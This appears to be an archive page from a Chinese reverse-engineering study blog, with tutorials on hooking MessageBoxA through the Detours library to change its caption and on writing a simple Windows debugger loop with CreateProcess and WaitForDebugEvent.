<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//dllmain.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"detours.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"detourshook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(WINAPI * TrueMessageBoxA)</span><span class="params">(HWND hWnd, LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCaption, UINT uType)</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="function">DETOURSHOOK_API <span class="keyword">int</span> WINAPI <span class="title">HookedMessageBoxA</span><span class="params">(HWND hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nRet = TrueMessageBoxA(hWnd, lpText, <span class="string">"Hooked Message"</span>, uType);</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DllProcessAttach</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DetourRestoreAfterWith();</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach(&amp;(PVOID&amp;)TrueMessageBoxA, HookedMessageBoxA);</span><br><span class="line">    <span class="keyword">if</span>(DetourTransactionCommit() != NO_ERROR)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DllProcessDetach</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourDetach(&amp;(PVOID&amp;)TrueMessageBoxA, HookedMessageBoxA);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                      )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        DllProcessAttach();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        DllProcessDetach();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在github上找到detours的源文件，detours.cpp+detours.h+disasm.cpp+modules.cpp+detver.h。</p>
<p>加入工程编译。当DLLMain收到DLL_PROCESS_ATTACH消息时，会调用DllProcessAttach()函数，当DLL被加载到进程中时，API钩子就开始生效了。</p>
<p>DLLProcessAttach 用于挂载钩子，DLlProcessDetach用于解除钩子，在函数内部，会先调用DetourTransactionBegin和DetourUpdateThread，然后再用DetourAttach或者DetourDetach来挂载或解除钩子。最后，程序调用DetourTransactionCommit函数并退出。</p>
<h1 id="3-修改消息框的标题栏"><a href="#3-修改消息框的标题栏" class="headerlink" title="3. 修改消息框的标题栏"></a>3. 修改消息框的标题栏</h1><p>HookedMessageBoxA 函数的内部会调用 TrueMessageBoxA，也就是原始的 MessageBoxA 函数。为了确认 HookedMessageBoxA 确实被调用过，我们可以将消息框的标题栏改为“Hooked Message”。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//helloworld.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE h = LoadLibrary(<span class="string">"detourshook.dll"</span>);</span><br><span class="line">    MessageBoxA(GetForegroundWindow(),</span><br><span class="line">       <span class="string">"Hello World! using MessageBoxA"</span>, <span class="string">"Message"</span>, MB_OK);</span><br><span class="line">    FreeLibrary(h);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>C:\&gt;helloword.exe</code> 标题栏从Message变成了HookedMessage。</p>
<p>钩子的原理是将函数开头的几个字节替换成jmp指令，强制跳转到另一个函数。可以用 OD 打开挂载了钩子的进程，看一下 MessageBoxA 函数的运行过程，应该会更容易理解钩子的原理。</p>
<p>（上面所用到的 API 钩子基本上只适用于运行在用户领域的 DLL 所导出的函数，但也可以通过劫持非公开的 API 等方式，对运行在内核领域（Ring0）的驱动程序挂载钩子。）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;; Target Function</span><br><span class="line">…</span><br><span class="line">TargetFunction:</span><br><span class="line"> push ebp</span><br><span class="line"> mov ebp,esp</span><br><span class="line"> push ebx</span><br><span class="line"> push esi</span><br><span class="line"> push edi</span><br><span class="line">…</span><br><span class="line">;; Trampoline</span><br><span class="line">…</span><br><span class="line">TrampolineFunction:</span><br><span class="line"> jmp TargetFunction</span><br></pre></td></tr></table></figure>
<p>到=》</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">;; Target Function</span><br><span class="line">…</span><br><span class="line">TargetFunction:</span><br><span class="line"> jmp DetourFunction</span><br><span class="line">TargetFunction+5:</span><br><span class="line"> push edi</span><br><span class="line">…</span><br><span class="line">;; Trampoline</span><br><span class="line">…</span><br><span class="line">TrampolineFunction:</span><br><span class="line"> push ebp</span><br><span class="line"> mov ebp,esp</span><br><span class="line"> push ebx</span><br><span class="line"> push esi</span><br><span class="line"> jmp TargetFunction+5</span><br><span class="line">…</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>detourshook:<br>链接: <a href="https://pan.baidu.com/s/1ak0QN8O1n8PB1w6xm73jwg" target="_blank" rel="noopener">https://pan.baidu.com/s/1ak0QN8O1n8PB1w6xm73jwg</a> 密码: 2iwi</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/06/API钩子/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-调试器原理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/06/调试器原理/">调试器原理</a>
    </h1>
  

        
        <a href="/2018/07/06/调试器原理/" class="archive-article-date">
  	<time datetime="2018-07-06T07:18:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-06</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="调试器原理"><a href="#调试器原理" class="headerlink" title="调试器原理"></a>调试器原理</h2><h3 id="1-调试器的工作原理"><a href="#1-调试器的工作原理" class="headerlink" title="1.调试器的工作原理"></a>1.调试器的工作原理</h3><p>这有一段简单的调试器代码：test1.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test1.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;	</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"C:\\&gt;%s &lt;sample.exe&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">    BOOL r = CreateProcess(</span><br><span class="line">        <span class="literal">NULL</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">        NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span>(!r)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    ResumeThread(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        DEBUG_EVENT de;</span><br><span class="line">        <span class="keyword">if</span>(!WaitForDebugEvent(&amp;de, INFINITE))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        DWORD dwContinueStatus = DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(de.dwDebugEventCode)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_PROCESS_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"CREATE_PROCESS_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> CREATE_THREAD_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"CREATE_THREAD_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXIT_THREAD_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"EXIT_THREAD_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXIT_PROCESS_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"EXIT_PROCESS_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:</span><br><span class="line">            DWORD r = de.u.Exception.ExceptionRecord.ExceptionCode;</span><br><span class="line">            <span class="keyword">if</span>(r != EXCEPTION_BREAKPOINT)</span><br><span class="line">                dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"EXCEPTION_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OUTPUT_DEBUG_STRING_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"OUTPUT_DEBUG_STRING_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RIP_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"RIP_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> LOAD_DLL_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"LOAD_DLL_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> UNLOAD_DLL_DEBUG_EVENT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"UNLOAD_DLL_DEBUG_EVENT\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ContinueDebugEvent(</span><br><span class="line">            de.dwProcessId, de.dwThreadId, dwContinueStatus);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br></pre></td></tr></table></figure>
<p>首先，程序通过CreateProcess函数启动调试目标进程，（调试目标进程也叫调试对象或者被调试程序）。</p>
<p>调用CreateProcess函数时，如果设置了DEBUG_PROCESS 或 DEBUG_ONLY_THIS_PROCESS 标志，则启动的进程（调试对象）中所产生的异常都会被调试器捕捉到。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DEBUG_PROCESS 标志</span><br><span class="line">#调试对象所产生的子进程，以及子进程的子进程都作为调试对象</span><br><span class="line">DEBUG_ONLY_THIS_PROCESS</span><br><span class="line">#只将通过 CreateProcess 启动的那一个进程作为调试对象</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateProcess函数</span></span><br><span class="line"><span class="comment">//https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425.aspx</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpApplicationName,      <span class="comment">// 可执行模块名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPTSTR lpCommandLine,           <span class="comment">// 命令行字符串</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    BOOL bInheritHandles,           <span class="comment">// 句柄继承选项</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwCreationFlags,          <span class="comment">// 创建标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpEnvironment,           <span class="comment">// 新进程的环境变量块</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPCTSTR lpCurrentDirectory,     <span class="comment">// 当前路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPSTARTUPINFO lpStartupInfo,    <span class="comment">// 启动信息</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 进程信息</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//第1参数或第二参数可用于传递目标程序的路径，便于启动进程。</span></span><br><span class="line"><span class="comment">//DWORD dwCreationFlags: NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS</span></span><br><span class="line"><span class="comment">//CREATE_SUSPENDED标志可以让进程在启动后进入挂起状态，当设置这一标志时，CreateProcess 函数调用完成之后，新进程中的所有线程都会暂停。尽管程序没有在运行，但程序的可执行文件已经被载入内存，这时我们可以在运行之前对调试对象的数据进行改写。</span></span><br></pre></td></tr></table></figure>
<p>在程序中，没有进行任何操作而是直接调用了ResumeThread函数，这时调试对象的所有线程就会恢复运行。</p>
<table>
<thead>
<tr>
<th>Constant/value</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>CREATE_SUSPENDED</strong>0x00000004</td>
<td>The primary thread of the new process is created in a suspended state, and does not run until the <a href="https://docs.microsoft.com/en-us/windows/desktop/api" target="_blank" rel="noopener"><strong>ResumeThread</strong></a>function is called.</td>
</tr>
</tbody>
</table>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ResumeThread</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms685086.aspx</span></span><br><span class="line"><span class="function">DWORD <span class="title">ResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hThread   <span class="comment">// 线程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>当调试对象程序开始运行后，调试器就开始等待捕捉异常。调试事件会通过 WaitForDebugEvent 函数来进行接收。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WaitForDebugEvent</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681423.aspx</span></span><br><span class="line"><span class="function">BOOL <span class="title">WaitForDebugEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">// 保存调试事件信息的结构体指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDEBUG_EVENT lpDebugEvent,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">// 事件等待时间（毫秒）</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>WaitForDebugEvent 函数的第1参数传递了一个DEBUG_EVENT结构体，捕捉到的调试事件会被存放在这个结构体中，第2参数 dwMilliseconds 如果设置为INFINITE 则表示一直等待。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DEBUG_EVENT</span></span><br><span class="line"><span class="comment">//https://msdn.microsoft.com/en-us/library/windows/desktop/ms679308.aspx</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> &#123;</span></span><br><span class="line">    DWORD dwDebugEventCode;<span class="comment">//调试事件编号</span></span><br><span class="line">    DWORD dwProcessId;<span class="comment">//进程ID</span></span><br><span class="line">    DWORD dwThreadId;<span class="comment">//线程ID</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        EXCEPTION_DEBUG_INFO      Exception;</span><br><span class="line">        CREATE_THREAD_DEBUG_INFO  CreateThread;</span><br><span class="line">        CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;</span><br><span class="line">        EXIT_THREAD_DEBUG_INFO    ExitThread;</span><br><span class="line">        EXIT_PROCESS_DEBUG_INFO   ExitProcess;</span><br><span class="line">        LOAD_DLL_DEBUG_INFO       LoadDll;</span><br><span class="line">        UNLOAD_DLL_DEBUG_INFO     UnloadDll;</span><br><span class="line">        OUTPUT_DEBUG_STRING_INFO  DebugString;</span><br><span class="line">        RIP_INFO                  RipInfo;</span><br><span class="line">    &#125; u;</span><br><span class="line">&#125; DEBUG_EVENT, *LPDEBUG_EVENT;</span><br></pre></td></tr></table></figure>
<p>接下来的数据会随dwDebugEventCode的不同而发生变化。可以取如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">调试事件</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">EXCEPTION_DEBUG_EVENT</td>
<td style="text-align:center">发生异常</td>
</tr>
<tr>
<td style="text-align:left">CREATE_THREAD_DEBUG_EVENT</td>
<td style="text-align:center">创建线程</td>
</tr>
<tr>
<td style="text-align:left">CREATE_PROCESS_DEBUG_EVENT</td>
<td style="text-align:center">创建进程</td>
</tr>
<tr>
<td style="text-align:left">EXIT_THREAD_DEBUG_EVENT</td>
<td style="text-align:center">线程结束</td>
</tr>
<tr>
<td style="text-align:left">EXIT_PROCESS_DEBUG_EVENT</td>
<td style="text-align:center">进程结束</td>
</tr>
<tr>
<td style="text-align:left">LOAD_DLL_DEBUG_EVENT</td>
<td style="text-align:center">加载DLL</td>
</tr>
<tr>
<td style="text-align:left">UNLOAD_DLL_DEBUG_EVENT</td>
<td style="text-align:center">卸载DLL</td>
</tr>
<tr>
<td style="text-align:left">OUTPUT_DEBUG_STRING_EVENT</td>
<td style="text-align:center">调用OutputDebugString函数</td>
</tr>
<tr>
<td style="text-align:left">RIP_EVENT</td>
<td style="text-align:center">发生系统调试错误</td>
</tr>
</tbody>
</table>
<p>在test1.cpp中当接收到调试事件时，会使用printf将事件的内容显示出来。通过访问union定义的结构体就可以获取调试对象的信息。当处理被交给调试器时，调试对象会暂停运行。因此，在我们的调试器显示消息的过程中，调试对象是处于暂停状态的。调用 ContinueDebugEvent 函数可以让调试对象恢复运行，这时调试器又回到 WatiForDebugEvent 函数等待下一条调试事件。</p>
<p>运行的时候<code>C:\&gt;test1.exe &quot;......exe&quot;</code> 此创建进程、线程以及加载、卸载 DLL 等事件都被调试器捕捉。</p>
<p><img src="/2018/07/06/调试器原理/1.png" alt="1"></p>
<h3 id="2-实现反汇编功能"><a href="#2-实现反汇编功能" class="headerlink" title="2.实现反汇编功能"></a>2.实现反汇编功能</h3><p>希望在发生异常时，能够显示出发生异常的地址以及当前寄存器的值，还希望显示发生异常时所执行的指令。可以使用 udis86 来实现反汇编。udis86是开源的反汇编器，源代码<a href="https://github.com/vmt/udis86" target="_blank" rel="noopener">https://github.com/vmt/udis86</a> 。我再看书的时候，fork了爱甲健二的VS2010编译的二进制文件。<a href="https://github.com/showmeshell404/udis86。" target="_blank" rel="noopener">https://github.com/showmeshell404/udis86。</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 